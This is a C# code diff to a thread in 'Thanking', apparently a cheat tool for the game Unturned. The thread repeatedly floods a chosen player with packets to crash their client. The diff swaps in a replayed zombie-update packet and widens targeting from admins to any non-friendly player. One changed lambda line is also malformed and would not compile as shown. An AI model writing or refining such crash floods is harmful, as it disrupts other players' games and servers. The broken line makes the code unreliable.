@@ -1,4 +1,4 @@
-﻿using System.Linq;
+﻿﻿using System.Linq;
 using System.Threading;
 using SDG.Unturned;
 using Steamworks;    
@@ -17,15 +17,19 @@ namespace Thanking.Threads
         [Thread]
         public static void Start()
         {
+            Thread.Sleep(5000);
             #if DEBUG
 			DebugUtilities.Log("Player Crash Thread Started");
 			#endif
             Provider.onEnemyDisconnected += OnDisconnect;
-     
+
+            ZombieManager.instance.channel.getPacket(ESteamPacket.UPDATE_UNRELIABLE_INSTANT,
+                ZombieManager.instance.channel.getCall("askZombies"), out int size, out byte[] Packet, (byte)0, (byte)0);
+            
             while (true)
             {
                 if (PlayerCrashEnabled)
-                    Provider.send(CrashTarget, (ESteamPacket)255, new byte[0], 1, 0);
+                    Provider.send(CrashTarget, ESteamPacket.UPDATE_UNRELIABLE_INSTANT, Packet, size, ZombieManager.instance.channel.id);
                 
                 else
                 {
@@ -33,16 +37,20 @@ namespace Thanking.Threads
                         continue;
 
                     PlayerCrashEnabled = true;
+                    
                     CrashTarget = Provider.clients.OrderBy(p => p.isAdmin ? 1 : 0)
-                        .First(p => p.isAdmin && !FriendUtilities.IsFriendly(p.player)).playerID.steamID;
+                        .First(!FriendUtilities.IsFriendly(p.player)).playerID.steamID;
                 }
             }
         }
 
         public static void OnDisconnect(SteamPlayer player)
         {
-            if (player.playerID.steamID == CrashTarget)
+            if (player.playerID.steamID == CrashTarget) 
+            {
                 PlayerCrashEnabled = false;
+                CrashTarget = CSteamID.Nil;
+            }
         }
     }
 }
